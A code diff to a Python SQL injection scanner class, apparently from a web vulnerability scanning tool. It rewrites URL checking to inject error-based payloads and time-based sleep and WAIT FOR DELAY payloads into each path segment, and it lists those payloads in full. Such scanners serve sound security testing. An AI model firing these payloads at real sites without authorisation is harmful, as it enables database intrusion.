@@ -1,3 +1,4 @@
+import urllib
 import urllib.parse as urlparse
 from copy import deepcopy
 from datetime import datetime
@@ -12,7 +13,7 @@ from Models.InjectionFoundDTO import InjectionType, InjectionFoundDTO
 
 
 class SqliManager:
-    def __init__(self, domain, cookies, headers):
+    def __init__(self, domain, cookies='', headers={}):
         self._result = None
         self._domain = domain
         self._false_positives = ['malformed request syntax',
@@ -20,7 +21,7 @@ class SqliManager:
         self._error_based_payloads = ['\'', '\\', '"', '%27', '%5C', '%2F']
         self._time_based_payloads = [
             {'TruePld': '\'OR(if(1=1,sleep(5),0))OR\'', 'FalsePld': '\'OR(if(1=2,sleep(5),0))OR\''},
-            {'TruePld': '\'OR(if(1=1,sleep(5),0))--%20', 'FalsePld': '\'OR(if(1=2,sleep(5),0))--%20'},
+            {'TruePld': '\'OR(if(1=1,sleep(5),0))--%20-', 'FalsePld': '\'OR(if(1=2,sleep(5),0))--%20-'},
             {'TruePld': '1; WAIT FOR DELAY \'00:00:05', 'FalsePld': '1; WAIT FOR DELAY \'00:00:01'},
         ]
         self._delay_in_seconds = 5
@@ -109,15 +110,38 @@ class SqliManager:
 
     def __check_url(self, dto: GetRequestDTO):
 
-        parsed = urlparse.urlparse(dto.url)
-        base_url = f'{parsed.scheme}://{parsed.hostname}{parsed.path}/'
+        parsed = urllib.parse.urlparse(dto.url)
+        route_parts = [r for r in parsed.path.split('/') if r.strip()]
+        route_url_payloads = []
 
-        for payload in self._error_based_payloads:
-            self.__send_error_based_request(f'{base_url}{payload}', dto)
+        for index, part in enumerate(route_parts):
+            for payload in self._error_based_payloads:
+                payload_part = f'{part}{payload}'
+                new_route_parts = deepcopy(route_parts)
+                new_route_parts[index] = payload_part
+                new_url = f'{parsed.scheme}://{parsed.netloc}/{"/".join(new_route_parts)}?{parsed.query}'
+                route_url_payloads.append(new_url)
 
-        for payloads in self._time_based_payloads:
-            self.__send_time_based_request(f'{base_url}{payloads["TruePld"]}',
-                                           f'{base_url}{payloads["FalsePld"]}')
+        for url in route_url_payloads:
+            self.__send_error_based_request(url, dto)
+
+        route_time_based_payloads = []
+        for index, part in enumerate(route_parts):
+            for payloads in self._time_based_payloads:
+                payload_part = f'{part}{payloads["TruePld"]}'
+                new_route_parts = deepcopy(route_parts)
+                new_route_parts[index] = payload_part
+                true_new_url = f'{parsed.scheme}://{parsed.netloc}/{"/".join(new_route_parts)}?{parsed.query}'
+
+                payload_part = f'{part}{payloads["FalsePld"]}'
+                new_route_parts = deepcopy(route_parts)
+                new_route_parts[index] = payload_part
+                false_new_url = f'{parsed.scheme}://{parsed.netloc}/{"/".join(new_route_parts)}?{parsed.query}'
+
+                route_time_based_payloads.append([true_new_url, false_new_url])
+
+        for payloads in route_time_based_payloads:
+            self.__send_time_based_request(payloads[0], payloads[1])
 
     def __check_get_params(self, dto: GetRequestDTO):
         error_based_payloads_urls = set()
